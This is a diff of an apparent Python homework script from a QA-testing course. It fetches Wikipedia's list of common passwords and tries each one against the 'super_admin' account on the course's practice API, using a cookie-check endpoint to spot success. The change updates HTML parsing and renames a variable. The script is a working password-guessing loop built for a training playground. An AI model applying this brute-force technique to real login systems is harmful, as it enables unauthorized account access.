@@ -10,8 +10,7 @@
 # Если верно указано поле login, но передан неправильный password, то авторизационная cookie все равно вернется.
 # НО с "неправильным" значением, которое на самом деле не позволит создавать авторизованные запросы.
 # Только если и login, и password указаны верно, вернется cookie с "правильным" значением.
-# Таким образом используя только метод get_secret_password_homework невозможно узнать,
-# передали ли мы верный пароль или нет.
+# Таким образом используя только метод get_secret_password_homework невозможно узнать, передали ли мы верный пароль или нет.
 #
 # По этой причине нам потребуется второй метод, который проверяет правильность нашей авторизованной cookie:
 # https://playground.learnqa.ru/ajax/api/check_auth_cookie
@@ -38,15 +37,16 @@ import requests
 
 response = requests.get('https://en.wikipedia.org/wiki/List_of_the_most_common_passwords')
 # print(response.text)
-html_text_1 = response.text.split('<th>2019<sup id="cite_ref-splashdata2019_13-0" class="reference"><a href="#cite_note-splashdata2019-13">&#91;13&#93;</a></sup>\n</th></tr>\n<tr>\n<td align="center">1\n</td>')[1]
-html_text_2 = html_text_1.split('\n</td></tr></tbody></table>\n<h3><span class="mw-headline" id="Keeper">Keeper')[0]
+html_text_1 = response.text.split('<th>2019<sup id="cite_ref-splashdata2019_12-0" class="reference"><a href="#cite_note-splashdata2019-12"><span class="cite-bracket">&#91;</span>12<span class="cite-bracket">&#93;</span></a></sup>\n</th></tr>\n<tr>\n<td align="center">1\n</td>')[1]
+html_text_2 = html_text_1.split('\n</td></tr></tbody></table>\n<div class="mw-heading mw-heading3"><h3 id="Keeper">Keeper')[0]
 html_text_3 = html_text_2.split('<td align="left">')
 print(html_text_3)
 passwords = []
 for elem in html_text_3:
     value = elem.split('\n</td>')[0]
-    if value not in passwords:
-        passwords.append(value)
+    value2_ = value.split('<sup id=')[0]
+    if value2_ not in passwords:
+        passwords.append(value2_)
 passwords = passwords[1:]
 print(passwords)
 
@@ -54,10 +54,10 @@ for pass_word in passwords:
     payload = {"login": "super_admin", "password": pass_word}
     response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
     cookie_value = response1.cookies.get('auth_cookie')
-    cookies = {}
+    cookie = {}
     if cookie_value is not None:
-        cookies.update({'auth_cookie': cookie_value})
-    response2 = requests.get("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
+        cookie.update({'auth_cookie': cookie_value})
+    response2 = requests.get("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookie)
     if response2.text != 'You are NOT authorized':
         print(f'{response2.text}! Your password is: {pass_word}')
         break
